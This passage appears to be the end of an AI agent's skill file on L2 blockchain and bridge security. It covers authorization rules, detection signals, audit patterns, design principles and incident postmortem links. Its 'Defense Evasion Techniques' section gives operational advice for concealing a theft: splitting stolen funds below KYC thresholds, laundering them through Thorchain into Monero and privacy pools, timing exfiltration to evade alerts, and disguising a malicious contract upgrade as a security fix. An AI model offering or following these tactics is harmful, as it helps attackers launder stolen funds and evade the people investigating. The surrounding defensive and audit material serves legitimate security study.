- **Testnet vs mainnet**: never run exploits or PoCs against mainnet contracts without explicit authorization. Use `anvil --fork-url` to replay mainnet state locally — funds drained on a fork are simulated, not real. This is doubly important for bridges: a single accidentally-broadcast tx on mainnet can trigger real liquidations.
- **Authorization scope**: bug bounty programs (Immunefi, code4rena, Cantina) define what's in scope. For L2, scope often explicitly excludes the sequencer, validator nodes, and prover infrastructure — read the scope carefully before testing.
- **Off-chain components are not bounty targets by default**: probing the sequencer RPC, validator daemon, or relayer for vulns without explicit written scope is illegal in most jurisdictions and can land you in criminal court even if you find and report a bug.
- **Private keys**: never commit RPC URLs with embedded API keys. Never commit validator private keys, sequencer keys, or multisig signer keys — even for testnet. Use environment variables in `.env` (gitignored). For L2 devnets, the dev keys (`$DEV_PRIVATE_KEY`) are publicly known and must never be reused on mainnet.
- **Bridge incidents are real emergencies**: if your protocol is live and you discover a bridge vulnerability, treat it as a 911 incident. Bridges concentrate TVL from multiple chains — a single exploit drains everything. Contact the team privately, prepare a pause, and have a migration plan ready.
- **Cryptography review requires expertise**: ZK proof system soundness, BLS signature aggregation, and threshold cryptography require specialist review. If you're not an expert, partner with one. A "looks correct" review of a verifier is worse than no review — it gives false confidence.
- **Lightning Network mainnet**: opening real channels and conducting pin attacks on Lightning mainnet causes real financial harm to routing nodes. Use regtest (the `--network=regtest` flag) for any attack research.
- **Sequencer DoS**: DoS-ing a mainnet sequencer (e.g., by spamming it with expensive transactions) is an attack on every user of the rollup. Use the local OP Bedrock / Arbitrum Nitro devnet only.

## Detection Methods

### L2 Bridge / Sequencer Detection
- **Bridge transaction anomalies**: Sudden spike in large bridge transactions; user base correlation.
- **Sequencer pause events**: Sequencer going offline without scheduled maintenance.
- **Fraud proof submission**: Fraud proof transaction submitted; alert on protocol-level dispute.
- **Validator set changes**: Unexpected validator additions/removals; signature threshold changes.
- **Data availability anomalies**: L1 data posting delays; cert/fcommit batch missing.

### Smart Contract Audit
- **Reentrancy patterns**: External call before state update; `transfer` followed by `call`.
- **Integer overflow/underflow**: Pre-Solidity 0.8 arithmetic without SafeMath.
- **Access control flaws**: `public` modifier on privileged functions; missing `onlyOwner`.
- **Flash loan attack signatures**: Same-block borrow + manipulate + repay pattern.

### SIEM Detection Rules
- **Forta Network**: Runtime detection bots for suspicious contract interactions.
- **OpenZeppelin Defender Sentinel**: Custom monitoring rules.
- **Splunk SPL (Web3)**: `index=web3 chain=l2 | stats count by from | where count > 100`
- **Etherscan/ Arbiscan alerts**: Anomalous token movements flagged by community.

## Defense Evasion Techniques

### Bridge Exploitation Stealth
- **Use legitimate bridge UI**: Don't directly interact with bridge contract; use official frontend (avoid phishing pattern).
- **Multiple small withdrawals**: Split large exfil across many wallets; below exchange KYC threshold.
- **Cross-chain laundering**: ETH → BTC → Monero via Thorchain; breaks on-chain traceability.
- **Tornado Cash alternatives**: Use Railgun, Aztec v2 (when available); privacy-preserving pools.
- **Time-delayed exfil**: Wait 24h+ between exploit and exfil; reduces exchange rate-limit alerts.

### Sequencer Exploitation Stealth
- **Single-shot exploit**: Don't replay attack across multiple blocks; avoid pattern detection.
- **Off-hours timing**: Execute during low-L1-gas windows; reduces monitoring attention.
- **Use MEV bundles**: Bundle exploit with legitimate MEV opportunity; blends with searcher activity.
- **Frontrun yourself**: Use builder auction to ensure your tx is included; no mempool visibility.

### Smart Contract Stealth
- **Gradual fund drain**: Spread drain over many blocks; below per-block anomaly threshold.
- **Use legitimate-looking contracts**: Mimic legitimate DeFi contract patterns; avoid obvious exploit signatures.
- **Hide exploit in upgrade**: Push malicious upgrade as "security fix"; appears legitimate.
- **Cross-protocol chaining**: Use flash loan from Aave to exploit Curve; harder to attribute.

## Hacker Laws

- **Trust but Verify** — A "5-of-9 multisig" on a spec sheet is not proof the threshold is enforced. Read the verifier contract, count the actual required signatures, and check for any path that bypasses the threshold. The 2022 Ronin hack had a 5-of-9 spec but an off-chain path that reduced it to effectively 3-of-5.
- **Defense in Depth** — A bridge must layer: signature aggregation + timelock on validator changes + rate limit on mints + WatchTower / Sentinel pause + multisig pauser. Any single layer alone can be bypassed.
- **First Principles** — Every bridge exploit reduces to: (a) key compromise, (b) signature/replay bypass, (c) message-deserialization bug, or (d) accounting drift between lock and mint. Memorize the four; spot every instance.
- **Minimize Attack Surface** — Bridges are the highest-value target in crypto. The more TVL a bridge holds, the more attackers are incentivized. Don't build a bridge if you don't need one — prefer atomic swaps, L1-native interoperability, or a chain that natively supports your asset.
- **Information Wants to Be Free** — All on-chain state is public. The validator set is public. The sequencer address is public. The multisig threshold is public. Attackers have this information instantly; defenders must publish it just as openly.
- **Obscurity Is Not Security** — "We don't publish our validator set to protect the signers" is not a defense. The set is recoverable from on-chain signatures in minutes. The only effect of obscurity is preventing users from making informed trust decisions.
- **Weakest Link Is Human** — The most expensive L2 hacks (Ronin, Multichain, Horizon) were not cryptographic failures. They were human failures: social engineering of validator operators, key custodianship in oppressive jurisdictions, and unencrypted key backups. Audit the humans and the operational security, not just the contract.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/blockchain-l2-attack-playbook.md` — comprehensive playbook with L2 architecture comparison, bridge security taxonomy, real-world exploit deep-dives, audit methodology, and local lab setup.
- **Related skills**:
  - `skills/blockchain-web3/SKILL.md` — for L1 smart-contract auditing (Solidity, EVM, reentrancy, DeFi economic attacks). This skill is the prerequisite.
  - `skills/crypto-attacks/SKILL.md` — for the cryptographic primitives L2 builds on (ECDSA, BLS, Merkle proofs, zero-knowledge proof systems).
  - `skills/pentest-reporting/SKILL.md` — for structuring the audit deliverable.
  - `skills/cloud-security/SKILL.md` — for the off-chain infrastructure (validator nodes, sequencer, prover) which often runs in cloud environments.
  - `skills/exploit-development/SKILL.md` — for the rigor of PoC writing (transfers to forge test PoCs).
- **External resources**:
  - Wormhole Postmortem (2022): [wormhole.com/wormhole-incident-report](https://wormhole.com/wormhole-incident-report/)
  - Nomad Bridge Incident Analysis (samczsun): [paradigm.xyz/article/nomad-bridge-exploit](https://www.paradigm.xyz/article/2022/08/nomad-bridge-exploit)
  - Ronin Bridge Postmortem (Sky Mavis): [roninblockchain.substack.com/p/ronin-exploit-postmortem](https://roninblockchain.substack.com/p/ronin-exploit-postmortem)
  - Poly Network Incident: [rekt.news/polynetwork-rekt](https://rekt.news/polynetwork-rekt/)
  - Multichain Incident (2023): [rekt.news/multichain-rekt-2](https://rekt.news/multichain-rekt-2/)
  - Horizon Bridge Hack: [rekt.news/harmony-rekt](https://rekt.news/harmony-rekt/)
  - Rekt Leaderboard: [rekt.news/leaderboard](https://rekt.news/leaderboard/)
  - DeFi Yields Research: [defiyields.app/rekt-database](https://defiyields.app/rekt-database)
  - Immunefi: [immunefi.com](https://immunefi.com/) — bridge bug bounties are among the largest ($1M-$10M+ payouts)
  - Lightning BOLT Specs: [github.com/lightning/bolts](https://github.com/lightning/bolts)
  - Optimism OP Stack Docs: [docs.optimism.io](https://docs.optimism.io/)
  - Arbitrum Nitro Docs: [docs.arbitrum.io](https://docs.arbitrum.io/)
  - zkSync Docs: [docs.zksync.io](https://docs.zksync.io/)
  - StarkNet Book: [book.cairo-lang.org](https://book.cairo-lang.org/)
  - ERC-4337 Account Abstraction: [eips.ethereum.org/EIPS/eip-4337](https://eips.ethereum.org/EIPS/eip-4337)
  - SoK: Cross-Chain Bridges (academic survey): [arxiv.org/abs/2208.00865](https://arxiv.org/abs/2208.00865)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
